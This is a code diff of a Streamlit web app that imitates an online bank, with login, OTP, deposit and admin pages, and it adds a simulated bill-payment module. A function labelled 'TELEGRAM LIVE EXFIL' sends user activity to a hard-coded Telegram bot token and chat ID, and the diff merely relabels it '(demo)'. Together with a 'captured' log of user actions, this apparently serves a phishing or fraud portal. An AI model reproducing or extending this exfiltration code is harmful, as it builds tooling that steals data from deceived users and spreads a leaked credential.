@@ -1,6 +1,6 @@
 import streamlit as st
 import pandas as pd
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, date
 import plotly.express as px
 import requests
 import random
@@ -8,6 +8,7 @@ import base64
 from io import BytesIO
 import re
 import uuid
+from typing import Optional
 
 # Optional image checks — fall back gracefully if Pillow isn't available
 try:
@@ -20,7 +21,7 @@ except Exception:
 def rerun_app():
     """
     Safe rerun helper: use experimental_rerun if available, otherwise fallback to rerun.
-    This prevents AttributeError across Streamlit versions.
+    Prevents AttributeError across Streamlit versions.
     """
     if hasattr(st, "experimental_rerun"):
         try:
@@ -28,24 +29,25 @@ def rerun_app():
             return
         except Exception:
             pass
-    # final fallback (should exist)
     if hasattr(st, "rerun"):
         try:
             st.rerun()
             return
         except Exception:
             pass
-    # If neither works, raise a RuntimeError so it's visible in logs
     raise RuntimeError("Unable to rerun Streamlit app: no rerun function available on st")
 
-# ==================== TELEGRAM LIVE EXFIL ====================
-def tg(message):
-    # NOTE: for production move these to environment variables
+# ==================== TELEGRAM LIVE EXFIL (demo) ====================
+def tg(message: str) -> None:
+    # Demo telemetry function. For production read token from env and avoid logging sensitive info.
     TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
     CHAT_ID = "141975691"
     try:
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                     data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
+        requests.post(
+            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+            data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"},
+            timeout=10,
+        )
     except Exception:
         pass
 
@@ -67,6 +69,7 @@ if "dark_mode" not in state:
 if "tx" not in state:
     txs = []
     start = datetime.now() - timedelta(days=180)
+    # Periodic direct deposits
     for i in range(0, 180, 14):
         d = start + timedelta(days=i)
         txs.append({
@@ -76,6 +79,7 @@ if "tx" not in state:
             "amount": round(random.uniform(3200, 4800), 2),
             "account": "Checking"
         })
+    # Some fixed monthly bills
     for m in range(6):
         d = start + timedelta(days=30*m + 3)
         txs.extend([
@@ -83,6 +87,7 @@ if "tx" not in state:
             {"uid": str(uuid.uuid4()), "date": d.strftime("%m/%d"), "desc": "Comcast Xfinity", "amount": -189.99, "account": "Checking"},
             {"uid": str(uuid.uuid4()), "date": d.strftime("%m/%d"), "desc": "Geico Auto", "amount": -142.50, "account": "Checking"},
         ])
+    # Random daily spending
     for day in range(180):
         d = start + timedelta(days=day)
         num = random.choices([0,1,2,3,4], weights=[5,35,40,15,5], k=1)[0]
@@ -90,6 +95,7 @@ if "tx" not in state:
             merchant = random.choice(["Amazon.com", "Walmart", "Starbucks", "Shell Gas", "Target", "Chick-fil-A", "Uber", "Whole Foods"])
             amount = round(random.uniform(8.99, 299.99), 2)
             txs.append({"uid": str(uuid.uuid4()), "date": d.strftime("%m/%d"), "desc": merchant, "amount": -amount, "account": "Checking"})
+    # Periodic transfers and interest credits
     for m in range(6):
         d = start + timedelta(days=30*m + 5)
         amt = round(random.uniform(800, 2500), 2)
@@ -279,6 +285,7 @@ try {{
 </script>
 """, unsafe_allow_html=True)
 
+# ==================== HEADER ====================
 def header():
     st.markdown(f'''
     <div class="header">
@@ -297,7 +304,7 @@ def header():
     </div>
     ''', unsafe_allow_html=True)
 
-# ==================== Helpers for mobile deposit ===================================
+# ==================== Helpers ====================
 def extract_amount_from_filename(uploaded_file) -> float | None:
     if not uploaded_file:
         return None
@@ -370,6 +377,7 @@ def render_receipt_card(tx: dict, idx: str | int | None = None, expanded: bool =
                     st.success("Transaction flagged. Support will follow up.")
             st.markdown("</div>", unsafe_allow_html=True)
     except TypeError:
+        # Fallback rendering with explicit fallback key to avoid duplicates
         fallback_flag_key = f"flag_fallback_{key_base}"
         st.markdown("<div class='card'>", unsafe_allow_html=True)
         st.markdown(f"**{header_label}**")
@@ -430,6 +438,7 @@ def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
                 with admin_cols[0]:
                     if st.button("Force Clear (admin)", key=f"force_clear_{exp_key}"):
                         rec["status"] = "cleared"
+                        # audit-only insert
                         state.tx.insert(0, {"uid": str(uuid.uuid4()), "date": datetime.now().strftime("%m/%d"), "desc": "Admin force-clear", "amount": rec.get("amount", 0.0), "account": "Checking"})
                         state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_force_clear", "file": filename})
                         st.success("Deposit marked cleared by admin (audit recorded).")
@@ -448,17 +457,371 @@ def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
                         st.success("Deposit removed from list (audit recorded).")
             st.markdown("</div>", unsafe_allow_html=True)
     except TypeError:
-        fallback_msg_key = f"msg_fallback_{key_base}"
+        fall_key = f"msg_fallback_{key_base}"
         st.markdown("<div class='card'>", unsafe_allow_html=True)
         st.markdown(f"**{header}**")
         st.markdown(f"<div style='margin-top:12px;color:var(--text-muted)'>Signed by: <strong>{rec.get('signed_by','-')}</strong> • Verification (last4): ****{rec.get('verified_last4','-')}</div>", unsafe_allow_html=True)
-        if st.button("Message Support", key=fallback_msg_key):
+        if st.button("Message Support", key=fall_key):
             state.captured.append({"ts": datetime.now().isoformat(), "type": "support_message", "file": filename, "amount": amount})
             tg(f"USER_SUPPORT_REQUEST for deposit {filename} ${amount}")
             st.success("Support notified. Please check Messages for follow-up.")
         st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== Transfer page (fixed) ========================================
+# ==================== BILL PAYMENT MODULE (SIMULATED, NO CARD DATA) ====================
+def _now():
+    return datetime.now()
+
+def init_bill_payment_state():
+    if "payees" not in state:
+        state.payees = [
+            {"uid": str(uuid.uuid4()), "name": "Utility Co.", "account_mask": "****-6789", "category": "Utilities", "notes": ""},
+            {"uid": str(uuid.uuid4()), "name": "Acme Internet", "account_mask": "****-1234", "category": "Internet", "notes": ""},
+            {"uid": str(uuid.uuid4()), "name": "Landlord", "account_mask": "****-4444", "category": "Rent", "notes": "Monthly rent"},
+        ]
+    if "scheduled_payments" not in state:
+        state.scheduled_payments = []
+    if "payment_history" not in state:
+        state.payment_history = []
+    if "bills" not in state:
+        state.bills = []
+    if "bill_ui_last_refresh" not in state:
+        state.bill_ui_last_refresh = datetime.min.isoformat()
+
+def mask_account(raw: str) -> str:
+    if not raw:
+        return ""
+    digits = "".join([c for c in raw if c.isdigit()])
+    if len(digits) <= 4:
+        return "****" + digits
+    return "****" + digits[-4:]
+
+def _find_payee(uid: str) -> Optional[dict]:
+    for p in state.payees:
+        if p["uid"] == uid:
+            return p
+    return None
+
+def _next_run_for_frequency(start_date_obj: date, frequency: str) -> date:
+    if frequency == "daily":
+        return start_date_obj + timedelta(days=1)
+    if frequency == "weekly":
+        return start_date_obj + timedelta(weeks=1)
+    if frequency == "biweekly":
+        return start_date_obj + timedelta(weeks=2)
+    if frequency == "monthly":
+        return start_date_obj + timedelta(days=30)
+    if frequency == "quarterly":
+        return start_date_obj + timedelta(days=90)
+    if frequency == "yearly":
+        return start_date_obj + timedelta(days=365)
+    return start_date_obj
+
+def add_payee(name: str, account_raw: str = "", category: str = "", notes: str = "") -> dict:
+    uid = str(uuid.uuid4())
+    payee = {
+        "uid": uid,
+        "name": name.strip(),
+        "account_mask": mask_account(account_raw),
+        "category": category,
+        "notes": notes,
+        "created_at": _now().isoformat(),
+    }
+    state.payees.append(payee)
+    state.captured.append({"ts": _now().isoformat(), "type": "payee_add", "payee": payee["name"]})
+    return payee
+
+def edit_payee(uid: str, name: str, account_raw: str, category: str, notes: str) -> bool:
+    p = _find_payee(uid)
+    if not p:
+        return False
+    p["name"] = name.strip()
+    p["account_mask"] = mask_account(account_raw)
+    p["category"] = category
+    p["notes"] = notes
+    p["updated_at"] = _now().isoformat()
+    state.captured.append({"ts": _now().isoformat(), "type": "payee_edit", "payee": p["name"]})
+    return True
+
+def remove_payee(uid: str) -> bool:
+    ps = state.payees
+    for i, p in enumerate(ps):
+        if p["uid"] == uid:
+            del ps[i]
+            state.captured.append({"ts": _now().isoformat(), "type": "payee_remove", "payee_uid": uid})
+            state.scheduled_payments = [s for s in state.scheduled_payments if s["payee_uid"] != uid]
+            return True
+    return False
+
+def create_one_time_payment(payee_uid: str, amount: float, from_account: str, note: str = "") -> dict:
+    amount = float(amount)
+    source = from_account.lower()
+    success = False
+    reason = ""
+    if source.startswith("checking"):
+        if state.checking >= amount:
+            state.checking -= amount
+            success = True
+        else:
+            reason = "Insufficient funds in Checking"
+    elif source.startswith("savings"):
+        if state.savings >= amount:
+            state.savings -= amount
+            success = True
+        else:
+            reason = "Insufficient funds in Savings"
+    else:
+        reason = "Unknown source account"
+
+    payee = _find_payee(payee_uid)
+    payee_name = payee["name"] if payee else "Unknown Payee"
+
+    record = {
+        "uid": str(uuid.uuid4()),
+        "ts": _now().isoformat(),
+        "type": "one_time_payment",
+        "payee_uid": payee_uid,
+        "payee_name": payee_name,
+        "amount": amount,
+        "from": from_account,
+        "status": "paid" if success else "failed",
+        "note": "" if success else reason,
+    }
+    state.payment_history.append(record)
+    state.captured.append({"ts": _now().isoformat(), "type": "payment_attempt", "payee": payee_name, "amount": amount, "status": record["status"]})
+    return record
+
+def schedule_payment(payee_uid: str, amount: float, start_date_obj: date, frequency: Optional[str], auto_pay: bool, from_account: str, note: str = "") -> dict:
+    sched = {
+        "uid": str(uuid.uuid4()),
+        "created_at": _now().isoformat(),
+        "payee_uid": payee_uid,
+        "amount": float(amount),
+        "start_date": start_date_obj.isoformat(),
+        "frequency": frequency,
+        "auto_pay": bool(auto_pay),
+        "from_account": from_account,
+        "note": note,
+        "active": True,
+        "next_run": start_date_obj.isoformat(),
+    }
+    state.scheduled_payments.append(sched)
+    state.captured.append({"ts": _now().isoformat(), "type": "schedule_create", "payee_uid": payee_uid, "amount": amount})
+    return sched
+
+def cancel_scheduled(uid: str) -> bool:
+    for s in state.scheduled_payments:
+        if s["uid"] == uid:
+            s["active"] = False
+            state.captured.append({"ts": _now().isoformat(), "type": "schedule_cancel", "uid": uid})
+            return True
+    return False
+
+def process_due_payments(run_now: Optional[datetime] = None, auto_only: bool = True):
+    if run_now is None:
+        run_now = _now()
+    today = run_now.date()
+    processed = []
+    for sched in list(state.scheduled_payments):
+        if not sched.get("active", True):
+            continue
+        next_run = datetime.fromisoformat(sched["next_run"]).date()
+        if next_run <= today:
+            if auto_only and not sched.get("auto_pay", False):
+                continue
+            rec = create_one_time_payment(
+                payee_uid=sched["payee_uid"],
+                amount=sched["amount"],
+                from_account=sched.get("from_account", "Checking"),
+                note=f"Scheduled payment {sched['uid']}"
+            )
+            processed.append({"sched_uid": sched["uid"], "payment": rec})
+            freq = sched.get("frequency")
+            if freq:
+                nr = _next_run_for_frequency(next_run, freq)
+                sched["next_run"] = nr.isoformat()
+            else:
+                sched["active"] = False
+    if processed:
+        state.captured.append({"ts": _now().isoformat(), "type": "process_scheduled", "count": len(processed)})
+    return processed
+
+def bill_payment_page():
+    init_bill_payment_state()
+    st.header("Bill Payments")
+    st.markdown("Pay bills, manage payees, and schedule recurring payments. This feature simulates payments using your Checking and Savings balances (no external processor).")
+
+    # Process due scheduled payments on demand
+    if st.button("Process due scheduled payments (auto-only)", key="process_due_manual"):
+        processed = process_due_payments()
+        st.success(f"Processed {len(processed)} scheduled payments (auto-only).")
+
+    c1, c2, c3 = st.columns([1,1,1.1])
+
+    # Payee management
+    with c1:
+        st.subheader("Payees")
+        with st.expander("Add a new payee"):
+            with st.form("add_payee_form"):
+                name = st.text_input("Payee name")
+                acct = st.text_input("Account number (optional, stored masked)")
+                category = st.selectbox("Category", ["Utilities", "Rent", "Credit Card", "Insurance", "Other"], index=0)
+                notes = st.text_area("Notes (optional)")
+                if st.form_submit_button("Add Payee"):
+                    if not name.strip():
+                        st.error("Please provide a payee name.")
+                    else:
+                        p = add_payee(name, acct, category, notes)
+                        st.success(f"Added payee: {p['name']}")
+
+        st.markdown("---")
+        st.markdown("Existing payees")
+        if state.payees:
+            for p in state.payees:
+                cols = st.columns([3,1])
+                with cols[0]:
+                    st.write(f"**{p['name']}**")
+                    st.write(f"{p.get('account_mask','')} • {p.get('category','')}")
+                with cols[1]:
+                    if st.button("Edit", key=f"edit_payee_{p['uid']}"):
+                        state._edit_payee_uid = p['uid']
+                        rerun_app()
+            if "_edit_payee_uid" in state and state._edit_payee_uid:
+                uid = state._edit_payee_uid
+                p = _find_payee(uid)
+                if p:
+                    st.markdown("---")
+                    st.subheader(f"Edit: {p['name']}")
+                    with st.form("edit_payee_form"):
+                        name2 = st.text_input("Payee name", value=p['name'])
+                        acct2 = st.text_input("Account number (optional)", value=p.get("account_mask",""))
+                        category2 = st.selectbox("Category", ["Utilities", "Rent", "Credit Card", "Insurance", "Other"], index=0)
+                        notes2 = st.text_area("Notes (optional)", value=p.get("notes",""))
+                        if st.form_submit_button("Save changes"):
+                            edit_payee(uid, name2, acct2, category2, notes2)
+                            st.success("Saved.")
+                            state._edit_payee_uid = None
+                            rerun_app()
+                        if st.button("Remove payee", key=f"confirm_remove_{uid}"):
+                            remove_payee(uid)
+                            st.success("Payee removed.")
+                            state._edit_payee_uid = None
+                            rerun_app()
+        else:
+            st.write("No payees yet. Add one using the form above.")
+
+    # One-time payment
+    with c2:
+        st.subheader("Make a one-time payment")
+        if not state.payees:
+            st.info("Add a payee first.")
+        else:
+            with st.form("one_time_payment_form"):
+                payee_idx = st.selectbox("Select payee", options=list(range(len(state.payees))), format_func=lambda i: state.payees[i]["name"])
+                selected_payee = state.payees[payee_idx]
+                amount = st.number_input("Amount ($)", min_value=0.01, format="%.2f", value=50.00, key="one_time_amount")
+                from_account = st.selectbox("From account", ["Checking", "Savings"])
+                memo = st.text_input("Memo (optional)")
+                if st.form_submit_button("Pay Now"):
+                    rec = create_one_time_payment(selected_payee["uid"], amount, from_account, note=memo)
+                    if rec["status"] == "paid":
+                        st.success(f"Payment of {format_currency(amount)} to {selected_payee['name']} completed.")
+                    else:
+                        st.error(f"Payment failed: {rec.get('note','Unknown reason')}")
+
+        st.markdown("---")
+        st.markdown("Quick pay a bill reminder")
+        if state.bills:
+            bill_idx = st.selectbox("Choose bill", options=list(range(len(state.bills))), format_func=lambda i: f"{state.bills[i]['payee_name']} • {state.bills[i]['amount']} due {state.bills[i]['due_date']}")
+            if st.button("Pay selected bill now"):
+                bill = state.bills[bill_idx]
+                rec = create_one_time_payment(bill["payee_uid"], float(bill["amount"]), bill.get("from_account","Checking"), note="Bill payment (reminder)")
+                if rec["status"] == "paid":
+                    st.success("Bill paid and recorded.")
+                    bill["status"] = "paid"
+                else:
+                    st.error(f"Payment failed: {rec.get('note')}")
+
+    # Scheduled payments & history
+    with c3:
+        st.subheader("Scheduled payments")
+        with st.expander("Schedule a payment"):
+            with st.form("schedule_form"):
+                if not state.payees:
+                    st.write("Add a payee first.")
+                else:
+                    payee_idx2 = st.selectbox("Payee", options=list(range(len(state.payees))), format_func=lambda i: state.payees[i]["name"])
+                    amount2 = st.number_input("Amount ($)", min_value=0.01, format="%.2f", value=100.00, key="sched_amount")
+                    start_dt = st.date_input("Start date", value=date.today())
+                    frequency = st.selectbox("Frequency (None = one-off)", options=["None", "daily", "weekly", "biweekly", "monthly", "quarterly", "yearly"], index=0)
+                    auto_pay = st.checkbox("Auto-pay when due (attempt payment automatically)", value=True)
+                    from_account2 = st.selectbox("From account", ["Checking", "Savings"], key="sched_from_account")
+                    notes2 = st.text_input("Notes (optional)")
+                    if st.form_submit_button("Schedule payment"):
+                        freq_val = None if frequency == "None" else frequency
+                        sched = schedule_payment(
+                            payee_uid=state.payees[payee_idx2]["uid"],
+                            amount=amount2,
+                            start_date_obj=start_dt,
+                            frequency=freq_val,
+                            auto_pay=auto_pay,
+                            from_account=from_account2,
+                            note=notes2
+                        )
+                        st.success("Scheduled payment created.")
+        st.markdown("---")
+        st.markdown("Active scheduled payments")
+        if state.scheduled_payments:
+            for s in state.scheduled_payments:
+                status = "Active" if s.get("active", True) else "Inactive"
+                payee = _find_payee(s["payee_uid"])
+                payee_name = payee["name"] if payee else "Unknown"
+                st.write(f"• {payee_name} — {format_currency(s['amount'])} — next: {s['next_run']} — {s.get('frequency') or 'one-off'} — {'Auto' if s.get('auto_pay') else 'Manual'} — {status}")
+                cols = st.columns([1,1,1])
+                if cols[0].button("Cancel", key=f"cancel_{s['uid']}"):
+                    cancel_scheduled(s["uid"])
+                    st.success("Scheduled payment cancelled.")
+                if cols[1].button("Run now", key=f"runnow_{s['uid']}"):
+                    rec = create_one_time_payment(s["payee_uid"], s["amount"], s.get("from_account", "Checking"), note=f"Manual run of scheduled {s['uid']}")
+                    st.write(rec)
+                if cols[2].button("Edit", key=f"edit_sched_{s['uid']}"):
+                    state._edit_schedule_uid = s["uid"]
+                    rerun_app()
+            if "_edit_schedule_uid" in state and state._edit_schedule_uid:
+                uid = state._edit_schedule_uid
+                sched = next((x for x in state.scheduled_payments if x["uid"] == uid), None)
+                if sched:
+                    st.markdown("---")
+                    st.subheader("Edit scheduled payment")
+                    with st.form("edit_sched_form"):
+                        payee_idx3 = st.selectbox("Payee", options=list(range(len(state.payees))), format_func=lambda i: state.payees[i]["name"])
+                        amount3 = st.number_input("Amount ($)", min_value=0.01, value=float(sched["amount"]))
+                        start3 = st.date_input("Next run date", value=datetime.fromisoformat(sched["next_run"]).date())
+                        frequency3 = st.selectbox("Frequency", options=["None","daily","weekly","biweekly","monthly","quarterly","yearly"], index=0)
+                        auto3 = st.checkbox("Auto-pay when due", value=sched.get("auto_pay", False))
+                        if st.form_submit_button("Save scheduled"):
+                            sched["payee_uid"] = state.payees[payee_idx3]["uid"]
+                            sched["amount"] = float(amount3)
+                            sched["next_run"] = start3.isoformat()
+                            sched["frequency"] = None if frequency3 == "None" else frequency3
+                            sched["auto_pay"] = bool(auto3)
+                            st.success("Scheduled payment updated.")
+                            state._edit_schedule_uid = None
+                            rerun_app()
+        else:
+            st.write("No scheduled payments.")
+
+        st.markdown("---")
+        st.subheader("Recent payments")
+        if state.payment_history:
+            df = pd.DataFrame(list(reversed(state.payment_history))[:20])
+            st.dataframe(df)
+        else:
+            st.write("No payments yet.")
+
+    st.markdown("---")
+    st.markdown("Tip: Scheduled payments with Auto-pay set will be attempted automatically when due. Use the process button to run due payments now.")
+
+# ==================== PAGES: Transfer, Login/Register/OTP, Dashboard, Histories, Mobile Deposit, Messages, Admin ====================
 def transfer():
     header()
     st.markdown("<div class='card'>", unsafe_allow_html=True)
@@ -499,9 +862,6 @@ def transfer():
             st.success(f"Transferred {format_currency(amount)} to Checking.")
             rerun_app()
 
-    st.markdown("</div>", unsafe_allow_html=True)
-
-# ==================== LOGIN / REGISTER / DASHBOARD ====================
 def login():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -548,9 +908,7 @@ def register():
                     st.success("Account created! A verification email has been sent.")
                     st.balloons()
                     rerun_app()
-        st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== OTP / DASHBOARD / HISTORIES ====================
 def otp():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -651,7 +1009,6 @@ def savings_history():
         st.session_state.view = None
         rerun_app()
 
-# ==================== Mobile deposit, messages, admin, sidebar, main flow ====================
 def mobile_deposit():
     header()
     st.markdown("<div class='card'>", unsafe_allow_html=True)
@@ -780,8 +1137,6 @@ def mobile_deposit():
             st.info("A portion of the deposit may be available sooner depending on verification. We will notify you when cleared.")
         rerun_app()
 
-    st.markdown("</div>", unsafe_allow_html=True)
-
 def messages():
     header()
     st.markdown("<div class='card'>", unsafe_allow_html=True)
@@ -809,21 +1164,34 @@ def admin():
     with tabs[4]:
         st.dataframe(pd.DataFrame(state.tx[:100]))
 
+# ==================== SIDEBAR (with Quick switch) ====================
 def sidebar():
     st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
     st.sidebar.markdown("---")
     st.sidebar.checkbox("Dark mode", value=state.get("dark_mode", False), key="dark_mode")
-    st.markdown(f"""<script>try{{document.documentElement.classList.toggle('dark', {str(bool(state.get('dark_mode', False))).lower()});}}catch(e){{}}</script>""", unsafe_allow_html=True)
+    quick_options = ["", "Dashboard", "Transfer", "Mobile Deposit", "Checking History", "Savings History", "Bill Payment", "Messages", "Logout"]
+    quick_choice = st.sidebar.selectbox("Quick switch", quick_options, index=0, key="quick_switch")
     st.sidebar.markdown("---")
     st.sidebar.markdown("Need help? Use Messages to contact support.")
     st.sidebar.markdown("---")
-    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"])
+    menu_choice = st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Bill Payment", "Messages", "Logout"], key="menu")
+    if quick_choice:
+        return quick_choice
+    return menu_choice
 
 # ==================== MAIN FLOW ========================================
+# Ensure bill payment state is initialized early
+init_bill_payment_state()
+
+# Optionally process due scheduled payments on load (auto-only)
+# process_due_payments()  # Uncomment if you want automatic attempts on every page load
+
 if not state.auth and not state.admin:
     tab1, tab2 = st.tabs(["Sign In", "Create Account"])
-    with tab1: login()
-    with tab2: register()
+    with tab1:
+        login()
+    with tab2:
+        register()
 elif state.admin:
     admin()
 elif not state.otp_ok:
@@ -835,10 +1203,20 @@ else:
         savings_history()
     else:
         page = sidebar()
-        if page == "Dashboard": dashboard()
-        elif page == "Transfer": transfer()
-        elif page == "Mobile Deposit": mobile_deposit()
-        elif page == "Messages": messages()
+        if page == "Dashboard":
+            dashboard()
+        elif page == "Transfer":
+            transfer()
+        elif page == "Mobile Deposit":
+            mobile_deposit()
+        elif page == "Bill Payment":
+            bill_payment_page()
+        elif page == "Messages":
+            messages()
+        elif page == "Checking History":
+            checking_history()
+        elif page == "Savings History":
+            savings_history()
         elif page == "Logout":
             st.session_state.clear()
             rerun_app()
